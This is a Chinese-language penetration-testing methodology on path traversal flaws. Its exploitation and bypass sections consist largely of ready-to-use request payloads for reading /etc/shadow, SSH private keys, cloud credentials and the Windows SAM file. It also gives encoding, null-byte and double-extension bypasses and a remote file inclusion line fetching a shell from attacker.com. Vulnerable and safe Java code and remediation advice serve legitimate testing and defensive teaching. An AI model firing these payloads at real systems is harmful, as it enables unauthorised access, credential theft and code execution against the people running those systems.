# 路径遍历设计缺陷攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的路径遍历设计缺陷检测与利用流程，帮助发现和利用文件路径处理设计层面的安全缺陷。

## 1.2 适用范围

本文档适用于所有处理文件路径的 Web 应用和系统，包括文件下载、文件查看、日志访问、配置管理、报告生成等场景。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

路径遍历设计缺陷是指系统在架构设计层面未对文件路径进行适当隔离和限制，导致攻击者可以访问预期范围之外的文件或目录。

**本质问题**：
- 文件路径验证设计缺失
- 沙箱隔离设计不足
- 访问控制设计缺陷
- 输入验证设计不当

### 与实现缺陷的区别

| 方面 | 设计缺陷 | 实现缺陷 |
|-----|---------|---------|
| 根源 | 架构设计缺失 | 代码过滤不足 |
| 修复 | 需要重新设计 | 加强过滤逻辑 |
| 检测 | 需要理解架构 | 可直接测试 |

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-73 | 外部控制文件名或路径 |
| CWE-22 | 路径遍历 |
| CWE-59 | 符号链接跟随 |
| CWE-98 | PHP 远程文件包含 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 文件下载 | 文档/报告下载 | 下载任意系统文件 |
| 文件查看 | 日志/配置查看 | 读取敏感配置文件 |
| 图片服务 | 头像/图片加载 | 读取非图片文件 |
| 备份系统 | 备份文件管理 | 访问备份数据 |
| 日志系统 | 日志文件访问 | 读取应用日志 |
| 模板系统 | 模板文件加载 | 模板文件包含 |
| 语言包 | 多语言文件加载 | 语言文件遍历 |
| 报告生成 | 报告文件存储 | 报告路径遍历 |

## 2.3 漏洞发现方法

### 2.3.1 黑盒测试

**步骤 1：识别文件操作入口**

```
常见入口点：
- 下载链接：?file=report.pdf
- 图片加载：?img=avatar.jpg
- 文档查看：?doc=user_guide.pdf
- 日志查看：?log=app.log
- 配置管理：?config=database.yml
```

**步骤 2：基础路径遍历测试**

```bash
# Linux 风格测试
GET /download?file=../../etc/passwd
GET /download?file=../../../etc/shadow
GET /download?file=....//....//etc/passwd

# Windows 风格测试
GET /download?file=..\..\..\windows\system32\config\sam
GET /download?file=..%5c..%5c..%5cwindows%5cwin.ini

# 混合测试
GET /download?file=..\..\..\etc/passwd
```

**步骤 3：编码绕过测试**

```bash
# URL 编码
GET /download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 双 URL 编码
GET /download?file=%252e%252e%252f

# UTF-8 编码
GET /download?file=..%c0%af..%c0%afetc/passwd

# Unicode 编码
GET /download?file=..%u2215..%u2215etc/passwd
```

### 2.3.2 白盒测试

**代码审计要点**

```java
// ❌ 危险模式：直接拼接用户输入
String filename = request.getParameter("file");
File file = new File("/var/www/files/" + filename);

// ❌ 危险模式：仅过滤部分字符
String safe = filename.replace("..", "");
File file = new File("/var/www/files/" + safe);
// 绕过：....//  →  ../

// ✅ 安全模式：使用白名单
if (!allowedFiles.contains(filename)) {
    throw new SecurityException();
}

// ✅ 安全模式：规范化路径检查
String canonicalPath = new File(baseDir, filename).getCanonicalPath();
if (!canonicalPath.startsWith(baseDir)) {
    throw new SecurityException();
}
```

## 2.4 漏洞利用方法

### 2.4.1 敏感文件读取

```bash
# Linux 系统文件
GET /download?file=../../etc/passwd
GET /download?file=../../etc/shadow
GET /download?file=../../etc/hosts
GET /download?file=../../etc/ssh/sshd_config

# 应用配置文件
GET /download?file=../../config/database.yml
GET /download?file=../../.env
GET /download?file=../../config/settings.py

# 日志文件
GET /download?file=../../logs/app.log
GET /download?file=../../logs/error.log
GET /download?file=../../logs/access.log
```

### 2.4.2 源代码泄露

```bash
# Java 应用
GET /download?file=../../WEB-INF/classes/com/app/User.class
GET /download?file=../../src/main/java/com/app/User.java

# PHP 应用
GET /download?file=../../index.php
GET /download?file=../../config.php
GET /download?file=../../includes/database.php

# Python 应用
GET /download?file=../../app.py
GET /download?file=../../config.py
GET /download?file=../../models/user.py
```

### 2.4.3 凭证窃取

```bash
# 数据库配置
GET /download?file=../../database.properties
# 内容：db.password=SuperSecret123

# 云凭证
GET /download?file=../../.aws/credentials
# 内容：AWS Access Key 和 Secret Key

# SSH 密钥
GET /download?file=../../.ssh/id_rsa
# 内容：私钥文件
```

### 2.4.4 结合其他漏洞利用

```bash
# 场景 1：路径遍历 + 文件包含
GET /include.php?file=../../etc/passwd
GET /include.php?file=http://attacker.com/shell.php

# 场景 2：路径遍历 + 文件上传
# 1. 上传恶意文件到可预测位置
# 2. 通过路径遍历包含执行

# 场景 3：路径遍历 + 日志注入
# 1. 向日志注入 PHP 代码
# 2. 通过路径遍历包含日志文件
# 3. 代码执行
```

### 2.4.5 符号链接攻击

```bash
# 场景：系统存在符号链接

# 1. 识别符号链接
ls -la /var/www/files/

# 2. 通过符号链接访问受限文件
# 如果存在指向 /etc 的符号链接
GET /download?file=symlink_to_etc/passwd
```

### 2.4.6 空字节注入（旧系统）

```bash
# 场景：PHP < 5.3.4, 旧版 Java

# 空字节截断
GET /download?file=../../etc/passwd%00.jpg

# 服务器认为文件是.jpg
# 实际访问的是/etc/passwd
```

## 2.5 漏洞利用绕过方法

### 2.5.1 过滤器绕过

**技巧 1：重复替换绕过**

```bash
# 过滤器：filename.replace("..", "")
# 绕过：
....//  →  ../
...././  →  ../
..../  →  ../
```

**技巧 2：编码绕过**

```bash
# 过滤器：检查".."字符串
# 绕过：
%2e%2e/      →  ../
%2e%2e%2f    →  ../
..%2f        →  ../
%2e%2e%252f  →  ../
```

**技巧 3：大小写绕过**

```bash
# Windows 系统
..%2F        →  ../
..%5C        →  ..\
```

**技巧 4：替代字符**

```bash
# 使用替代路径分隔符
..%c0%af     →  ../ (UTF-8 过编码)
..%c1%9c     →  ..\ (UTF-8 过编码)
```

### 2.5.2 验证逻辑绕过

**技巧 5：前缀检查绕过**

```bash
# 过滤器：检查是否以合法路径开头
# 合法路径：/var/www/files/

# 绕过：
/var/www/files/../../etc/passwd
# 规范化后：/etc/passwd
```

**技巧 6：后缀检查绕过**

```bash
# 过滤器：检查扩展名
# 只允许.jpg、.png

# 绕过：
shell.php.jpg      # 双扩展名
shell.php%00.jpg   # 空字节截断
shell.jpg/         # 目录遍历
```

### 2.5.3 架构设计绕过

**技巧 7：多组件架构绕过**

```
场景：代理→应用→文件服务器

1. 每个组件对路径的理解不同
2. 利用解析差异绕过验证
3. 最终访问非预期文件
```

**技巧 8：容器环境绕过**

```bash
# 场景：Docker 容器

# 1. 容器内路径：/app/files/
# 2. 挂载卷：/host/data:/app/files
# 3. 路径遍历：../../host/etc/passwd
```

---

# 第三部分：附录

## 3.1 路径遍历测试检查清单

```
□ 基础路径遍历测试 (../)
□ URL 编码测试 (%2e%2e%2f)
□ 双编码测试 (%252e%252e%252f)
□ UTF-8 编码测试 (%c0%af)
□ Windows 路径测试 (..\)
□ 混合路径测试 (../..\)
□ 空字节测试 (%00)
□ 双扩展名测试 (.php.jpg)
□ 符号链接测试
□ 绝对路径测试 (/etc/passwd)
□ 过滤器绕过测试
□ 规范化路径检查
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| Burp Suite | 请求篡改和 fuzzing | https://portswigger.net/burp |
| OWASP ZAP | 自动化扫描 | https://www.zaproxy.org/ |
| feroxbuster | 目录 fuzzing | https://github.com/epi052/feroxbuster |
| 自定义脚本 | 编码绕过测试 | Python |

## 3.3 修复建议

### 架构设计层面

1. **输入映射** - 使用固定 ID 映射到实际文件名
2. **沙箱环境** - 使用 chroot、容器等限制访问范围
3. **文件隔离** - 将用户文件与系统文件物理隔离

### 实现层面

```java
// ✅ 推荐做法 1：白名单映射
Map<String, String> fileMap = new HashMap<>();
fileMap.put("1", "/var/www/files/report1.pdf");
fileMap.put("2", "/var/www/files/report2.pdf");
String filePath = fileMap.get(userInput);

// ✅ 推荐做法 2：路径规范化检查
String baseDir = "/var/www/files";
String canonicalPath = new File(baseDir, userInput).getCanonicalPath();
if (!canonicalPath.startsWith(baseDir + File.separator)) {
    throw new SecurityException();
}

// ✅ 推荐做法 3：仅允许文件名
String fileName = Paths.get(userInput).getFileName().toString();
File file = new File(baseDir, fileName);
```

### 运维层面

1. **最小权限** - 应用以最低权限运行
2. **文件权限** - 限制敏感文件的读取权限
3. **监控告警** - 监控异常文件访问行为

---

**参考资源**：
- [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger - Directory Traversal](https://portswigger.net/web-security/file-path-traversal)
